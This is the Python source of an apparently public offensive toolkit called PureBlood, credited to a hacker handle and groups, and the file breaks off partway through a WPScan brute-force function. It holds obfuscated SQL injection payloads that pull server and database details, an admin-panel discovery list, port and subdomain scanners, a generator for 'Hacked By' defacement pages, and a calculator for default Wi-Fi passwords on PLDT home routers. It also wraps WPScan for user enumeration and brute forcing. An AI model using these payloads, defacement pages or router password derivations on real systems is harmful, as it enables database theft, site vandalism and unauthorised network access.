#!/usr/bin/python
# -*- coding: utf-8 -*-
"""
Script Created By:
    Cr4sHCoD3
Github:
    https://github.com/cr4shcod3
FB Page:
    https://facebook.com/cr4shcod3.py
Youtube:
    https://www.youtube.com/channel/UCEw5DaWEUY0XeUOTl1U2LKw
Buy Me A Coffee:
    https://www.buymeacoffee.com/f4a5kJcyl
Google Plus:
    https://plus.google.com/u/0/115239095310355713855
Copyrights:
    Cr4sHCoD3 2018
    MIT LICENSE
Special Mentions:
    PureHackers PH
    Blood Security Hackers
"""


import os
import sys
import platform
import time
import datetime
import re
import threading
import socket
import webbrowser
import hashlib
import random
import subprocess
import zipfile



if sys.version_info[0] == 3:
    from urllib.parse import urlparse
elif sys.version_info[0] == 2:
    from urlparse import urlparse



try:
    import colorama
    colorama.init()
except:
    print ('[!] - Module (colorama) not installed!')
    sys.exit()



try:
    import requests
    from requests.exceptions import ConnectionError
except:
    print ('[!] - Module (requests) not installed!')
    sys.exit()



try:
    import whois
except:
    print ('[!] - Module (python-whois) not installed!')
    sys.exit()



try:
    import dns.resolver
except:
    print ('[!] - Module (dnspython) not installed!')
    sys.exit()



try:
    from bs4 import BeautifulSoup
except:
    print ('[!] - Module (bs4) not installed!')
    sys.exit()



try:
    import shodan
except:
    print ('[!] - Module (shodan) not installed!')
    sys.exit()



#########################################################################################################################################################
# GLOBAL

FNULL = open(os.devnull, 'w')
google_hacking = 'https://www.google.com/search?q='
dios1 = '(/*!12345sELecT*/(@)from(/*!12345sELecT*/(@:=0x00),(/*!12345sELecT*/(@)from(InFoRMAtiON_sCHeMa.`ColUMNs`)where(`TAblE_sCHemA`=DatAbAsE/*data*/())and(@)in(@:=CoNCat%0a(@,0x3c7374726f6e672069643d2250757265426c6f6f64223e5461626c653a20,TaBLe_nAMe,0x203d3d20,column_name,0x3c2f7374726f6e673e3c62723e))))a)'
sqli_payload_hostname = 'CoNCat%0a(0x3c7374726f6e672069643d2250757265426c6f6f64494e464f223e,@@hostname,0x3c2f7374726f6e673e)'
sqli_payload_tmpdir = 'CoNCat%0a(0x3c7374726f6e672069643d2250757265426c6f6f64494e464f223e,@@tmpdir,0x3c2f7374726f6e673e)'
sqli_payload_datadir = 'CoNCat%0a(0x3c7374726f6e672069643d2250757265426c6f6f64494e464f223e,@@datadir,0x3c2f7374726f6e673e)'
sqli_payload_version = 'CoNCat%0a(0x3c7374726f6e672069643d2250757265426c6f6f64494e464f223e,@@version,0x3c2f7374726f6e673e)'
sqli_payload_basedir = 'CoNCat%0a(0x3c7374726f6e672069643d2250757265426c6f6f64494e464f223e,@@basedir,0x3c2f7374726f6e673e)'
sqli_payload_user = 'CoNCat%0a(0x3c7374726f6e672069643d2250757265426c6f6f64494e464f223e,user(),0x3c2f7374726f6e673e)'
sqli_payload_database = 'CoNCat%0a(0x3c7374726f6e672069643d2250757265426c6f6f64494e464f223e,database(),0x3c2f7374726f6e673e)'
sqli_payload_schema = 'CoNCat%0a(0x3c7374726f6e672069643d2250757265426c6f6f64494e464f223e,schema(),0x3c2f7374726f6e673e)'
sqli_payload_uuid = 'CoNCat%0a(0x3c7374726f6e672069643d2250757265426c6f6f64494e464f223e,UUID(),0x3c2f7374726f6e673e)'
sqli_payload_system_user = 'CoNCat%0a(0x3c7374726f6e672069643d2250757265426c6f6f64494e464f223e,system_user(),0x3c2f7374726f6e673e)'
sqli_payload_session_user = 'CoNCat%0a(0x3c7374726f6e672069643d2250757265426c6f6f64494e464f223e,session_user(),0x3c2f7374726f6e673e)'
sqli_payload_symlink = 'CoNCat%0a(0x3c7374726f6e672069643d2250757265426c6f6f64494e464f223e,@@GLOBAL.have_symlink,0x3c2f7374726f6e673e)'
sqli_payload_ssl = 'CoNCat%0a(0x3c7374726f6e672069643d2250757265426c6f6f64494e464f223e,@@GLOBAL.have_ssl,0x3c2f7374726f6e673e)'
sqli_dump_column_payload = 'CoNCat%0a(0x3c7374726f6e672069643d2250757265426c6f6f64494e464f223e,<column>,0x3c2f7374726f6e673e)'

## Color
reset = '\033[0m'
bold = '\033[1m'
underline = '\033[4m'
### Fore
black = '\033[90m'; red = '\033[91m'; green = '\033[92m'; yellow = '\033[93m'; blue = '\033[94m'; magenta = '\033[95m'; cyan = '\033[96m'; white = '\033[97m'
### Background
bg_black = '\033[90m'; bg_red = '\033[91m'; bg_green = '\033[92m'; bg_yellow = '\033[93m'; bg_blue = '\033[94m'; bg_magenta = '\033[95m'; bg_cyan = '\033[96m'; bg_white = '\033[97m'

## Configuration
if platform.system() == 'Windows':
    from ctypes import windll, create_string_buffer
    h = windll.kernel32.GetStdHandle(-12)
    csbi = create_string_buffer(22)
    res = windll.kernel32.GetConsoleScreenBufferInfo(h, csbi)
    if res:
        try:
            import struct
            (bufx, bufy, curx, cury, wattr,
            left, top, right, bottom, maxx, maxy) = struct.unpack("hhhhHhhhhhh", csbi.raw)
            sizex = right - left + 1
            sizey = bottom - top + 1
        except:
            print("[!] - Module (struct) not installed!")
    else:
        sizex, sizey = 80, 25
elif platform.system() == 'Linux' or platform.system() == 'Darwin':
    sizey, sizex = os.popen('stty size', 'r').read().split()
else:
    sizex = 50

## Date Time
month = datetime.date.today().strftime("%B")
if datetime.date.today().strftime("%w") == 1 or datetime.date.today().strftime("%w") == '1':
    day = 'Monday'
elif datetime.date.today().strftime("%w") == 2 or datetime.date.today().strftime("%w") == '2':
    day = 'Tuesay'
elif datetime.date.today().strftime("%w") == 3 or datetime.date.today().strftime("%w") == '3':
    day = 'Wednesday'
elif datetime.date.today().strftime("%w") == 4 or datetime.date.today().strftime("%w") == '4':
    day = 'Thursday'
elif datetime.date.today().strftime("%w") == 5 or datetime.date.today().strftime("%w") == '5':
    day = 'Friday'
elif datetime.date.today().strftime("%w") == 6 or datetime.date.today().strftime("%w") == '6':
    day = 'Saturday'
elif datetime.date.today().strftime("%w") == 7 or datetime.date.today().strftime("%w") == '0':
    day = 'Sunday'
mday = datetime.date.today().strftime("%d")
year = datetime.date.today().strftime("%Y")
current_datetime = datetime.datetime.now()
current_time = current_datetime.strftime('%I:%M:%S')

## List
ids = [
    'NONE','A','NS','MD','MF','CNAME','SOA','MB','MG','MR','NULL','WKS','PTR','HINFO','MINFO','MX','TXT','RP','AFSDB','X25','ISDN','RT','NSAP','NSAP-PTR','SIG','KEY','PX','GPOS','AAAA','LOC','NXT','SRV','NAPTR','KX','CERT','A6','DNAME','OPT','APL','DS','SSHFP','IPSECKEY','RRSIG','NSEC','DNSKEY','DHCID','NSEC3','NSEC3PARAM','TLSA','HIP','CDS','CDNSKEY','CSYNC','SPF','UNSPEC','EUI48','EUI64','TKEY','TSIG','IXFR','AXFR','MAILB','MAILA','ANY','URI','CAA','TA','DLV'
]
admin_panel_list = ['/admin.aspx','/admin.asp','/admin.php','/admin/','/administrator/','/moderator/','/webadmin/','/adminarea/','/bb-admin/','/adminLogin/','/admin_area/','/panel-administracion/','/instadmin/','/memberadmin/','/administratorlogin/','/adm/','/admin/account.php','/admin/index.php','/admin/login.php','/admin/admin.php','/admin/account.php','/joomla/administrator','/login.php','/admin_area/admin.php','/admin_area/login.php','/siteadmin/login.php','/siteadmin/index.php','/siteadmin/login.html','/admin/account.html','/admin/index.html','/admin/login.html','/admin/admin.html','/admin_area/index.php','/bb-admin/index.php','/bb-admin/login.php','/bb-admin/admin.php','/admin/home.php','/admin_area/login.html','/admin_area/index.html','/admin/controlpanel.php','/admincp/index.asp','/admincp/login.asp','/admincp/index.html','/admin/account.html','/adminpanel.html','/webadmin.html','webadmin/index.html','/webadmin/admin.html','/webadmin/login.html','/admin/admin_login.html','/admin_login.html','/panel-administracion/login.html','/admin/cp.php','cp.php','/administrator/index.php','/administrator/login.php','/nsw/admin/login.php','/webadmin/login.php','/admin/admin_login.php','/admin_login.php','/administrator/account.php','/administrator.php','/admin_area/admin.html','/pages/admin/admin-login.php','/admin/admin-login.php','/admin-login.php','/bb-admin/index.html','/bb-admin/login.html','/bb-admin/admin.html','/admin/home.html','/modelsearch/login.php','/moderator.php','/moderator/login.php','/moderator/admin.php','/account.php','/pages/admin/admin-login.html','/admin/admin-login.html','/admin-login.html','/controlpanel.php','/admincontrol.php','/admin/adminLogin.html','/adminLogin.html','/admin/adminLogin.html','/home.html','/rcjakar/admin/login.php','/adminarea/index.html','/adminarea/admin.html','/webadmin.php','/webadmin/index.php','/webadmin/admin.php','/admin/controlpanel.html','/admin.html','/admin/cp.html','cp.html','/adminpanel.php','/moderator.html','/administrator/index.html','/administrator/login.html','/user.html','/administrator/account.html','/administrator.html','/login.html','/modelsearch/login.html','/moderator/login.html','/adminarea/login.html','/panel-administracion/index.html','/panel-administracion/admin.html','/modelsearch/index.html','/modelsearch/admin.html','/admincontrol/login.html','/adm/index.html','/adm.html','/moderator/admin.html','/user.php','/account.html','/controlpanel.html','/admincontrol.html','/panel-administracion/login.php','/wp-login.php','/adminLogin.php','/admin/adminLogin.php','/home.php','/adminarea/index.php','/adminarea/admin.php','/adminarea/login.php','/panel-administracion/index.php','/panel-administracion/admin.php','/modelsearch/index.php','/modelsearch/admin.php','/admincontrol/login.php','/adm/admloginuser.php','/admloginuser.php','/admin2.php','/admin2/login.php','/admin2/index.php','adm/index.php','adm.php','affiliate.php','/adm_auth.php  ','/memberadmin.php','/administratorlogin.php','/login/admin.asp','/admin/login.asp','/administratorlogin.asp','/login/asmindstrator.asp','/admin/login.aspx','/login/admin.aspx','/administartorlogin.aspx','login/administrator.aspx','/adminlogin.asp','a/dminlogin.aspx','/admin_login.asp','/admin_login.aspx','/adminhome.asp','/adminhome.aspx''/administrator_login.asp','/administrator_login.aspx']
admin_panel_valid = []

dbms_errors = {
    'MySQL': (r'SQL syntax.*MySQL', r'Warning.*mysql_.*', r'MySQL Query fail.*', r'SQL syntax.*MariaDB server'),
    'PostgreSQL': (r'PostgreSQL.*ERROR', r'Warning.*\Wpg_.*', r'Warning.*PostgreSQL'),
    'Microsoft SQL Server': (r'OLE DB.* SQL Server', r'(\W|\A)SQL Server.*Driver', r'Warning.*odbc_.*', r'Warning.*mssql_', r'Msg \d+, Level \d+, State \d+', r'Unclosed quotation mark after the character string', r'Microsoft OLE DB Provider for ODBC Drivers'),
    'Microsoft Access': (r'Microsoft Access Driver', r'Access Database Engine', r'Microsoft JET Database Engine', r'.*Syntax error.*query expression'),
    'Oracle': (r'\bORA-[0-9][0-9][0-9][0-9]', r'Oracle error', r'Warning.*oci_.*', 'Microsoft OLE DB Provider for Oracle'),
    'IBM DB2': (r'CLI Driver.*DB2', r'DB2 SQL error'),
    'SQLite': (r'SQLite/JDBCDriver', r'System.Data.SQLite.SQLiteException'),
    'Informix': (r'Warning.*ibase_.*', r'com.informix.jdbc'),
    'Sybase': (r'Warning.*sybase.*', r'Sybase message')
}

## Threading Object Funtions
def TCP_connect(ip, port_number, delay, output):
    TCPsock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    TCPsock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    TCPsock.settimeout(delay)
    try:
        TCPsock.connect((ip, port_number))
        output[port_number] = 'Open'
    except:
        output[port_number] = ''

def dns_record_scanner(drs_hostname, ids_item, dns_record_list):
    try:
        answers = dns.resolver.query(drs_hostname, ids_item)
        for rdata in answers:
            ids_item = str(ids_item); rdata = str(rdata)
            dns_record_list.append(str(ids_item + ' : ' + rdata))
    except Exception:
        print("The scanner Error has happened, we will continue")
        pass

def subdomain_scanner(subdomain, so_200, so_301, so_302, so_403):
    subdomain = 'http://' + subdomain
    try:
        subdomain_scanner_request = requests.get(subdomain)
        subdomain_scanner_code = subdomain_scanner_request.status_code
        if subdomain_scanner_code == 200:
            so_200.append(subdomain)
        elif subdomain_scanner_code == 301:
            so_301.append(subdomain)
        elif subdomain_scanner_code == 302:
            so_302.append(subdomain)
        elif subdomain_scanner_code == 403:
            so_403.append(subdomain)
    except ConnectionError:
        print("Connection Error has happened, we will continue")
        pass

def directory_scanner(ds_url_list, directory_fuzz_final1, directory_fuzz_final2, directory_fuzz_final3):
    try:
        directory_fuzz_request = requests.get(ds_url_list)
        if directory_fuzz_request.status_code == 200:
            directory_fuzz_final1.append(ds_url_list)
        elif directory_fuzz_request.status_code == 301 or directory_fuzz_request.status_code == 302:
            directory_fuzz_final2.append(ds_url_list)
        elif directory_fuzz_request.status_code == 403:
            directory_fuzz_final3.append(ds_url_list)
    except:
        print("Scanner Error has happened, we will continue")
        pass

def file_scanner(fs_url_list, file_fuzz_final1, file_fuzz_final2, file_fuzz_final3):
    try:
        file_fuzz_request = requests.get(fs_url_list)
        if file_fuzz_request.status_code == 200:
            file_fuzz_final1.append(fs_url_list)
        elif file_fuzz_request.status_code == 301 or file_fuzz_request.status_code == 302:
            file_fuzz_final2.append(fs_url_list)
        elif file_fuzz_request.status_code == 403:
            file_fuzz_final3.append(fs_url_list)
    except:
        print("Scanner Issue has arised, we will continue")
        pass
# END GLOBAL
#########################################################################################################################################################

class Generator:
    def deface_page(self, title, shortcut_icon, meta_description, meta_image, logo, hacker_name, message1, message2, groups):
        deface_page_template = '''
<html>
<head>
  <title>--=[ Hacked By {0} ]=--</title>
  <meta charset=\"UTF-8\">
  <link rel=\"SHORTCUT ICON\" href=\"{1}\">
  <meta name=\"Author\" content=\"Cr4sHCoD3 | PureHackers x Blood Security Hackers\"/>
  <meta name=\"copyright\" content=\"PureHackers | Blood Security Hackers\"/>
  <meta name=\"description\" content=\"{2}.\"/> <!-- Change this -->
  <meta name=\"keywords\" content=\"Hacked, Pawned, Defaced, Security, PureHackers, Blood Security Hackers, PureBlood, Cr4sHCoD3\"/> <!-- Change this -->
  <meta property=\"og:title\" content=\"Hacked By {0}\"/>
  <meta property=\"og:image\" content=\"{3}\"> <!-- Change this -->

  <style>
  {9} url(\"https://cr4shcod3.github.io/python/pureblood/pureblood.css\");
  </style>
</head>
<body>
  <div class=\"bg\">
    <center>
      <img src=\"{4}\" class=\"logo\"/> <!-- Change This -->
      <h1 class=\"header glitch\" data-text=\"Hacked By {5}\">Hacked By {5}</h1><br><br>
      <p class=\"message\">{6}</p>
      <p class=\"message\">{7}</p><br><br>
      <p class=\"groups\">Greetings: {8}</p>
    </center>
  </div>
</body>
</html>
'''.format(title, shortcut_icon, meta_description, meta_image, logo, hacker_name, message1, message2, groups, '@import')
        self.deface_page_result = deface_page_template
        return self.deface_page_result

    def password_generator(self, length, text):
        password_generator_final1 = ''
        password_generator_final2 = ''
        password_generator_final3 = ''
        chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890!@#$%^&*()-_=+[{}];:\'"\|,<.>/?`~'
        for i in range(length):
            char_random = random.choice(chars)
            password_generator_final1 += char_random
        password_generator_final2 = hashlib.md5(text.encode('utf-8')).hexdigest()
        l33t_alphabet = ['4','8','(','|)','3','|=','9','#','1','_|','|<','|_','|\/|','|\|','0','|D','(,)','|2','$','7','|_|','\/','\/\/','><','\'/','(/)']
        for i in text:
            if i == 'a' or i == 'A':
                text = text.replace('a', l33t_alphabet[0]).replace('A', l33t_alphabet[0])
            elif i == 'b' or i == 'B':
                text = text.replace('b', l33t_alphabet[1]).replace('B', l33t_alphabet[1])
            elif i == 'c' or i == 'C':
                text = text.replace('c', l33t_alphabet[2]).replace('C', l33t_alphabet[2])
            elif i == 'd' or i == 'D':
                text = text.replace('d', l33t_alphabet[3]).replace('D', l33t_alphabet[3])
            elif i == 'e' or i == 'E':
                text = text.replace('e', l33t_alphabet[4]).replace('E', l33t_alphabet[4])
            elif i == 'f' or i == 'F':
                text = text.replace('f', l33t_alphabet[5]).replace('F', l33t_alphabet[5])
            elif i == 'g' or i == 'G':
                text = text.replace('g', l33t_alphabet[6]).replace('G', l33t_alphabet[6])
            elif i == 'h' or i == 'H':
                text = text.replace('h', l33t_alphabet[7]).replace('H', l33t_alphabet[7])
            elif i == 'i' or i == 'I':
                text = text.replace('i', l33t_alphabet[8]).replace('I', l33t_alphabet[8])
            elif i == 'j' or i == 'J':
                text = text.replace('j', l33t_alphabet[9]).replace('J', l33t_alphabet[9])
            elif i == 'k' or i == 'K':
                text = text.replace('k', l33t_alphabet[10]).replace('K', l33t_alphabet[10])
            elif i == 'l' or i == 'L':
                text = text.replace('l', l33t_alphabet[11]).replace('L', l33t_alphabet[11])
            elif i == 'm' or i == 'M':
                text = text.replace('m', l33t_alphabet[12]).replace('M', l33t_alphabet[12])
            elif i == 'n' or i == 'N':
                text = text.replace('n', l33t_alphabet[13]).replace('N', l33t_alphabet[13])
            elif i == 'o' or i == 'O':
                text = text.replace('o', l33t_alphabet[14]).replace('O', l33t_alphabet[14])
            elif i == 'p' or i == 'P':
                text = text.replace('p', l33t_alphabet[15]).replace('P', l33t_alphabet[15])
            elif i == 'q' or i == 'Q':
                text = text.replace('q', l33t_alphabet[16]).replace('Q', l33t_alphabet[16])
            elif i == 'r' or i == 'R':
                text = text.replace('r', l33t_alphabet[17]).replace('R', l33t_alphabet[17])
            elif i == 's' or i == 'S':
                text = text.replace('s', l33t_alphabet[18]).replace('S', l33t_alphabet[18])
            elif i == 't' or i == 'T':
                text = text.replace('t', l33t_alphabet[19]).replace('T', l33t_alphabet[19])
            elif i == 'u' or i == 'U':
                text = text.replace('u', l33t_alphabet[20]).replace('U', l33t_alphabet[20])
            elif i == 'v' or i == 'V':
                text = text.replace('v', l33t_alphabet[21]).replace('V', l33t_alphabet[21])
            elif i == 'w' or i == 'W':
                text = text.replace('w', l33t_alphabet[22]).replace('W', l33t_alphabet[22])
            elif i == 'x' or i == 'X':
                text = text.replace('x', l33t_alphabet[23]).replace('X', l33t_alphabet[23])
            elif i == 'y' or i == 'Y':
                text = text.replace('y', l33t_alphabet[24]).replace('Y', l33t_alphabet[24])
            elif i == 'z' or i == 'Z':
                text = text.replace('z', l33t_alphabet[25]).replace('Z', l33t_alphabet[25])
        password_generator_final3 = text
        self.password_generator_result1 = password_generator_final1
        self.password_generator_result2 = password_generator_final2
        self.password_generator_result3 = password_generator_final3
        return self.password_generator_result1, self.password_generator_result2, self.password_generator_result3

    def pldt_password_calculator(self, digit5, mac5):
        pldt_password_calculator_final1 = ['PLDTWIFI' + digit5, 'pldtwifi'+ digit5]
        pldt_password_calculator_final2_multiply = digit5 * 3
        pldt_password_calculator_final2 = ['PLDTWIFI' + pldt_password_calculator_final2_multiply, 'pldtwifi' + pldt_password_calculator_final2_multiply]
        digit55 = digit5
        for i in digit55:
            if i == '0':
                digit55.replace('0', 'f')
            elif i == '4':
                digit55.replace('4', 'b')
            elif i == '8':
                digit55.replace('8', '7')
            elif i == 'c':
                digit55.replace('c', '3')
            elif i == '1':
                digit55.replace('1', 'e')
            elif i == '5':
                digit55.replace('5', 'a')
            elif i == '9':
                digit55.replace('9', '6')
            elif i == 'd':
                digit55.replace('d', '2')
            elif i == '2':
                digit55.replace('2', 'd')
            elif i == '6':
                digit55.replace('6', '9')
            elif i == 'a':
                digit55.replace('a', '5')
            elif i == 'e':
                digit55.replace('e', '1')
            elif i == '3':
                digit55.replace('3', 'c')
            elif i == '7':
                digit55.replace('7', '8')
            elif i == 'b':
                digit55.replace('b', '4')
            elif i == 'f':
                digit55.replace('f', '0')
        pldt_password_calculator_final3 = 'wlan' + digit55
        pldt_password_calculator_final4 = ['PLDTWIFI' + digit55, 'pldtwifi' + digit55]
        pldt_password_calculator_final5 = 'HomeBro_' + mac5
        self.pldt_password_calculator_result1 = pldt_password_calculator_final1
        self.pldt_password_calculator_result2 = pldt_password_calculator_final2
        self.pldt_password_calculator_result3 = pldt_password_calculator_final3
        self.pldt_password_calculator_result4 = pldt_password_calculator_final4
        self.pldt_password_calculator_result5 = pldt_password_calculator_final5
        return self.pldt_password_calculator_result1, self.pldt_password_calculator_result2, self.pldt_password_calculator_result3, self.pldt_password_calculator_result4, self.pldt_password_calculator_result5

    def text_to_hash(self, text):
        md5_final = hashlib.md5(text.encode('utf-8')).hexdigest()
        sha1_final = hashlib.sha1(text.encode('utf-8')).hexdigest()
        sha224_final = hashlib.sha224(text.encode('utf-8')).hexdigest()
        sha256_final = hashlib.sha256(text.encode('utf-8')).hexdigest()
        sha384_final = hashlib.sha384(text.encode('utf-8')).hexdigest()
        sha512_final = hashlib.sha512(text.encode('utf-8')).hexdigest()
        md4 = hashlib.new('md4')
        md4.update(text.encode('utf-8'))
        md4_final = md4.hexdigest()
        ripemd160 = hashlib.new('ripemd160')
        ripemd160.update(text.encode('utf-8'))
        ripemd160_final = ripemd160.hexdigest()
        whirlpool = hashlib.new('whirlpool')
        whirlpool.update(text.encode('utf-8'))
        whirlpool_final = whirlpool.hexdigest()
        text_to_hash_final = """
Text To Hash Result:
[+] MD4: {0}
[+] MD5: {1}
[+] SHA1: {2}
[+] SHA224: {3}
[+] SHA256: {4}
[+] SHA384: {5}
[+] SHA512: {6}
[+] RipeMD160: {7}
[+] Whirlpool: {8}
""".format(md4_final, md5_final, sha1_final, sha224_final, sha256_final, sha384_final, sha512_final, ripemd160_final, whirlpool_final)
        self.text_to_hash_result = text_to_hash_final
        return self.text_to_hash_result



class WebApplicationAttack:
    def wp_scan(self, url):
        wp_scan_test_ruby_command = subprocess.call('ruby -v', shell=True, stdout=FNULL, stderr=subprocess.STDOUT)
        if wp_scan_test_ruby_command == 0:
            pass
        elif wp_scan_test_ruby_command == 1:
            print ('\n{2}[{1}!{2}] {3}- {1}Please install ruby first!{0}'.format(reset, red, blue, yellow))
            print ('Ruby Installer: https://rubyinstaller.org/')
            time.sleep(2)
            print ('')
            web_application_attack()
        if platform.system() == 'Windows':
            if not os.path.exists('external/wpscan-master'):
                wp_scan_download_curl = subprocess.call('curl -LO https://github.com/wpscanteam/wpscan/archive/master.zip', shell=True, stdout=FNULL, stderr=subprocess.STDOUT)
                if wp_scan_download_curl == 0:
                    wp_scan_unzip = zipfile.ZipFile('master.zip', 'r')
                    wp_scan_unzip.extractall('external/')
                    wp_scan_unzip.close()
                    os.remove('master.zip')
                elif wp_scan_download_curl == 1:
                    if os.path.exists('external/wpscan'):
                        os.rename('external/wpscan', 'external/wpscan-master')
                    else:
                        wp_scan_download_git = subprocess.call('cd external/ && git clone https://github.com/wpscanteam/wpscan', shell=True, stdout=FNULL, stderr=subprocess.STDOUT)
                        if wp_scan_download_git == 0:
                            os.rename('external/wpscan', 'external/wpscan-master')
                        elif wp_scan_download_git == 1:
                            print ('\n{2}[{1}!{2}] {3}- {1}Please install curl or git for windows first!{0}'.format(reset, red, blue, yellow))
                            print ('Tutorial: http://www.oracle.com/webfolder/technetwork/tutorials/obe/cloud/objectstorage/restrict_rw_accs_cntainers_REST_API/files/installing_curl_command_line_tool_on_windows.html')
                            time.sleep(2)
                            print ('')
                            web_application_attack()
            else:
                pass
            wp_scan = subprocess.call('ruby external/wpscan-master/wpscan --version', shell=True, stdout=FNULL, stderr=subprocess.STDOUT)
            if wp_scan != 0:
                print ('\n{2}[{1}!{2}] {3}- {1}Please install wpscan\'s dependencies first!{0}'.format(reset, red, blue, yellow))
                print ("""
Linux / MAC OS:
https://wpscan.org
Android:
    Termux / GNURoot
Windows:
http://www.seoeditors.com/expert-seo/how-to-install-wpscan-on-windows-10
https://blog.dewhurstsecurity.com/2017/05/03/installing-wpscan-on-windows-10.html
Kali Linux:
sudo apt-get install wpscan""")
                time.sleep(2)
                print ('')
                web_application_attack()
            else:
                pass
        else:
            wp_scan = subprocess.call('wpscan --version', shell=True, stdout=FNULL, stderr=subprocess.STDOUT)
            if wp_scan != 0:
                print ('\n{2}[{1}!{2}] {3}- {1}Please install wpscan\'s dependencies first!{0}'.format(reset, red, blue, yellow))
                print ("""
Linux / MAC OS:
https://wpscan.org
Android:
    Termux / GNURoot
Windows:
http://www.seoeditors.com/expert-seo/how-to-install-wpscan-on-windows-10
https://blog.dewhurstsecurity.com/2017/05/03/installing-wpscan-on-windows-10.html
Kali Linux:
sudo apt-get install wpscan""")
                time.sleep(2)
                print ('')
                web_application_attack()
            else:
                pass
        if wp_scan == 0:
            pass
        elif wp_scan == 1:
            print ('\n{2}[{1}!{2}] {3}- {1}Please install wpscan first!{0}'.format(reset, red, blue, yellow))
            print ("""
Linux / MAC OS:
https://wpscan.org
Android:
    Termux / GNURoot
Windows:
http://www.seoeditors.com/expert-seo/how-to-install-wpscan-on-windows-10
https://blog.dewhurstsecurity.com/2017/05/03/installing-wpscan-on-windows-10.html
Kali Linux:
sudo apt-get install wpscan""")
            time.sleep(2)
            print ('')
            web_application_attack()
        if platform.system() == 'Windows':
            print ('[#] - Updating WPScan:')
            subprocess.call('ruby external/wpscan-master/wpscan --batch --no-banner --no-color --update --disable-tls-checks', shell=True)
            print ('\n[#] - Running WPScan:')
            if sys.version_info[0] == 3:
                wp_scan_user_range = str(input('{0}PureBlood{1}>{0}WebApplicationAttack{1}>{0}WPScan({3}User Range[EX: 1-20]{1})> {2}'.format(green, blue, cyan, red)))
            elif sys.version_info[0] == 2:
                wp_scan_user_range = str(raw_input('{0}PureBlood{1}>{0}WebApplicationAttack{1}>{0}WPScan({3}User Range[EX: 1-20]{1})> {2}'.format(green, blue, cyan, red)))
            try:
                subprocess.call('ruby external/wpscan-master/wpscan -u '+hostname+' -r --batch --no-banner --verbose -t 500 -e u['+wp_scan_user_range+'],p,tt', shell=True)
            except Exception as e:
                print ('[!] - Error: {0}'.format(e))
                time.sleep(2)
                print ('')
                web_application_attack()
        else:
            print ('[#] - Updating WPScan:')
            subprocess.call('wpscan --batch --no-banner --update --disable-tls-checks', shell=True)
            print ('\n[#] - Running WPScan:')
            if sys.version_info[0] == 3:
                wp_scan_user_range = str(input('{0}PureBlood{1}>{0}WebApplicationAttack{1}>{0}WPScan({3}User Range[EX: 1-20]{1})> {2}'.format(green, blue, cyan, red)))
            elif sys.version_info[0] == 2:
                wp_scan_user_range = str(raw_input('{0}PureBlood{1}>{0}WebApplicationAttack{1}>{0}WPScan({3}User Range[EX: 1-20]{1})> {2}'.format(green, blue, cyan, red)))
            try:
                subprocess.call('wpscan -u '+hostname+' -r --batch --no-banner --verbose -t 500 -e u['+wp_scan_user_range+'],p,tt', shell=True)
            except Exception as e:
                print ('[!] - Error: {e}'.format(e))
                time.sleep(2)
                print ('')
                web_application_attack()

    def wp_scan_bruteforce(self, url):
        wp_scan_test_ruby_command = subprocess.call('ruby -v', shell=True, stdout=FNULL, stderr=subprocess.STDOUT)
        if wp_scan_test_ruby_command == 0:
            pass
        elif wp_scan_test_ruby_command == 1:
            print ('\n{2}[{1}!{2}] {3}- {1}Please install ruby first!{0}'.format(reset, red, blue, yellow))
            print ('Ruby Installer: https://rubyinstaller.org/')
            time.sleep(2)
            print ('')
            web_application_attack()
        if platform.system() == 'Windows':
            if not os.path.exists('external/wpscan-master'):
                wp_scan_download_curl = subprocess.call('curl -LO https://github.com/wpscanteam/wpscan/archive/master.zip', shell=True, stdout=FNULL, stderr=subprocess.STDOUT)
                if wp_scan_download_curl == 0:
                    wp_scan_unzip = zipfile.ZipFile('master.zip', 'r')
                    wp_scan_unzip.extractall('external/')
                    wp_scan_unzip.close()
                    os.remove('master.zip')
                elif wp_scan_download_curl == 1:
                    if os.path.exists('external/wpscan'):
                        os.rename('external/wpscan', 'external/wpscan-master')
                    else:
                        wp_scan_download_git = subprocess.call('cd external/ && git clone https://github.com/wpscanteam/wpscan', shell=True, stdout=FNULL, stderr=subprocess.STDOUT)
                        if wp_scan_download_git == 0:
                            os.rename('external/wpscan', 'external/wpscan-master')
                        elif wp_scan_download_git == 1:
                            print ('\n{2}[{1}!{2}] {3}- {1}Please install curl or git for windows first!{0}'.format(reset, red, blue, yellow))
                            print ('Tutorial: http://www.oracle.com/webfolder/technetwork/tutorials/obe/cloud/objectstorage/restrict_rw_accs_cntainers_REST_API/files/installing_curl_command_line_tool_on_windows.html')
                            time.sleep(2)
                            print ('')
                            web_application_attack()
            else:
                pass
            wp_scan = subprocess.call('ruby external/wpscan-master/wpscan --version', shell=True, stdout=FNULL, stderr=subprocess.STDOUT)
            if wp_scan != 0:
                print ('\n{2}[{1}!{2}] {3}- {1}Please install wpscan\'s dependencies first!{0}'.format(reset, red, blue, yellow))
                print ("""
Linux / MAC OS:
https://wpscan.org
Android:
    Termux / GNURoot
Windows:
http://www.seoeditors.com/expert-seo/how-to-install-wpscan-on-windows-10
https://blog.dewhurstsecurity.com/2017/05/03/installing-wpscan-on-windows-10.html
Kali Linux:
sudo apt-get install wpscan""")
                time.sleep(2)
                print ('')
                web_application_attack()
            else:
                pass
        else:
            wp_scan = subprocess.call('wpscan --version', shell=True, stdout=FNULL, stderr=subprocess.STDOUT)
            if wp_scan != 0:
                print ('\n{2}[{1}!{2}] {3}- {1}Please install wpscan\'s dependencies first!{0}'.format(reset, red, blue, yellow))
                print ("""
Linux / MAC OS:
https://wpscan.org
Android:
    Termux / GNURoot
Windows:
http://www.seoeditors.com/expert-seo/how-to-install-wpscan-on-windows-10
https://blog.dewhurstsecurity.com/2017/05/03/installing-wpscan-on-windows-10.html
Kali Linux:
sudo apt-get install wpscan""")
                time.sleep(2)
                print ('')
                web_application_attack()
            else:
                pass
        if wp_scan == 0:
            pass
        elif wp_scan == 1:
            print ('\n{2}[{1}!{2}] {3}- {1}Please install wpscan first!{0}'.format(reset, red, blue, yellow))
            print ("""
Linux / MAC OS:
https://wpscan.org
Android:
    Termux / GNURoot
Windows:
http://www.seoeditors.com/expert-seo/how-to-install-wpscan-on-windows-10
https://blog.dewhurstsecurity.com/2017/05/03/installing-wpscan-on-windows-10.html
Kali Linux:
sudo apt-get install wpscan""")
            time.sleep(2)
            print ('')
            web_application_attack()
        if platform.system() == 'Windows':
            print ('[#] - Updating WPScan:')
